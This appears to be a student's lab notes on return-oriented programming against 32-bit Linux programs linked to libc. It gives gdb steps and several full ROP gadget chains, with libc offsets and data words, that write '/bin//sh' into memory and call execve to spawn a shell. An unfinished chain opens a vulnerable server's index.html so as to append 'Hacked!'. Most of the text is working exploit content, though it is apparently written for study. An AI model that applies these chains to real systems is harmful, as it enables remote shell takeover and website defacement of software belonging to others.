Algorithm to perform ROP:

Note: ROP will not work if the -static flag is used while compiling the vulnerable programs.

-static flag: On systems that support dynamic linking, this prevents linking with the shared libraries. On other systems, this option has no effect. 
https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html#Link-Options

1. Find the base address of .data section
    
    Use the following commands
        gdb bin/rop/exploitable
        break main
        run aaa
        info files


2. Commands needed to spawn a shell (the data segment addresses are for bin/rop/exploitable)

    --> From the ROP tutorial PDF:

    Data segment: 0x0804a020 - 0x0804a028 is .data
    Linked library segment: b7e18000-b7fc5000 r-xp 00000000 08:01 857        /lib/i386-linux-gnu/libc-2.17.so

    ROP command: 0xf5160L: pop ecx ; pop eax ;;
    Data       :"/bin" = 0x2f62696e
    Address    : 0x4: Offset for /bin (.data base)
    ROP command: 0x2e09fL: mov [eax] ecx ;;
    ROP command: 0xf5160L: pop ecx ; pop eax ;;
    Data       :"//sh" = 0x2f2f7368
    Address    : 0x8: Offset for //sh (.data base)
    ROP command: 0x2e09fL: mov [eax] ecx ;;
    ROP command: 0x34964L: xor eax eax ;;
    ROP command: 0x2e8bbL: pop ecx ; pop edx ;;
    Padding    : 0x01010101 (To neutralize pop ecx)
    Address    : 0xc: Offset for NULL (.data base)
    ROP command: 0x113371L: mov [edx] eax ; xor eax eax ;;
    ROP command: 0xff102L: pop ecx ; pop ebx ;;
    Address    : 0xc: Offset for NULL (.data base)
    Address    : 0x4: Offset for /bin (.data base)
    ROP command: 0x14da28L: add eax 0xb ;;
    ROP command: 0xbaa75L: call dword [gs:0x10] ;;

    --> Mixture of paper and tutorial's algorithms:

    Linked library segment: b7e18000-b7fc5000 r-xp 00000000 08:01 857        /lib/i386-linux-gnu/libc-2.17.so
    return address: 0xbfffed5c

    ROP command: 0xf5160L: pop ecx ; pop eax ;;
    Data       :"/bin" = 0x2f62696e
    Address    : End of stack
    ROP command: 0x2e09fL: mov [eax] ecx ;;
    ROP command: 0xf5160L: pop ecx ; pop eax ;;
    Data       :"//sh" = 0x2f2f7368
    Address    : End of stack (Return address + size of stack *4 ) + 4
    ROP command: 0x2e09fL: mov [eax] ecx ;;
    ROP command: 0x34964L: xor eax eax ;;
    ROP command: 0x2e8bbL: pop ecx ; pop edx ;;
    Padding    : 0x01010101 (To neutralize pop ecx)
    Address    : End of stack + 8
    ROP command: 0x113371L: mov [edx] eax ; xor eax eax ;;
    ROP command: 0xff102L: pop ecx ; pop ebx ;;
    Address    : End of stack + 8
    Address    : End of stack
    ROP command: 0x14da28L: add eax 0xb ;;
    ROP command: 0xbaa75L: call dword [gs:0x10] ;;

    --> From the ROP tutorial PDF:

    Data segment: 0x0804a010 - 0x0804a018 is .data
    Linked library segment: b7e20000-b7fc3000 r-xp 00000000 08:01 857        /lib/i386-linux-gnu/libc-2.15.so

    ROP command: 0xf2d21L: pop ecx ; pop eax ;;
    Data       :"/bin" = 0x2f62696e
    Address    : 0x4: Offset for /bin (.data base)
    ROP command: 0x2d71fL: mov [eax] ecx ;;
    ROP command: 0xf2d21L: pop ecx ; pop eax ;;
    Data       :"//sh" = 0x2f2f7368
    Address    : 0x8: Offset for //sh (.data base)
    ROP command: 0x2d71fL: mov [eax] ecx ;;
    ROP command: 0x341a5L: xor eax eax ;;
    ROP command: 0x2df7bL: pop ecx ; pop edx ;;
    Padding    : 0x01010101 (To neutralize pop ecx)
    Address    : 0xc: Offset for NULL (.data base)
    ROP command: 0x8d5e4L: mov [edx] eax ; mov eax edx ;;
    ROP command: 0x341a5L: xor eax eax ;;
    ROP command: 0xfca82L: pop ecx ; pop ebx ;;
    Address    : 0xc: Offset for NULL (.data base)
    Address    : 0x4: Offset for /bin (.data base)
    ROP command: 0x148428L: add eax 0xb ;;
    ROP command: 0xb8dc5L: call dword [gs:0x10] ;;


3. Commands needed to append "Hacked!" to "index.html" of the vulnerable server

    Data segment of simple_server: 0x0804b088 - 0x0804b090 is .data

    ; Opening the file
    ROP command: 0xf2d21L: pop ecx ; pop eax ;; Store inde
    Data       :"inde"
    Address    : 0x4: Offset for inde (.data base)
    ROP command: 0x2d71fL: mov [eax] ecx ;; Store x.htm
    ROP command: 0xf2d21L: pop ecx ; pop eax ;;
    Data       :"x.htm"
    Address    : 0x4: Offset for inde (.data base)
    ROP command: 0x2d71fL: mov [eax] ecx ;;
    ROP command: 0x2df7bL: pop ecx ; pop edx ;; Store null after index.htm
    Padding    : 0x01010101 (To neutralize pop ecx)
    Address    : 0xc: Offset for NULL (.data base)
    ROP command: 0x8d5e4L: mov [edx] eax ; mov eax edx ;;
    ROP command: 0x1820b5L: mov ecx [edx] ;; Clear ecx
    ROP command: 0x341a5L: xor eax eax ;; Clear eax
    ROP command: 0xa9a20L: mov eax 0x5 ;; Store 0x5 in eax
    ROP command: 0x1976eL: pop ebx ;; Store address of index.htm in ebx
    Address    : 0x4: Offset for inde (.data base)
    ROP command: 0x17b6d7L: inc ecx ;;
    ROP command: 0x17b6d7L: inc ecx ;; Store 0x2 in ecx
    ROP command: EDX needs to contain 0644 or 0x1a4, find a way to do this.





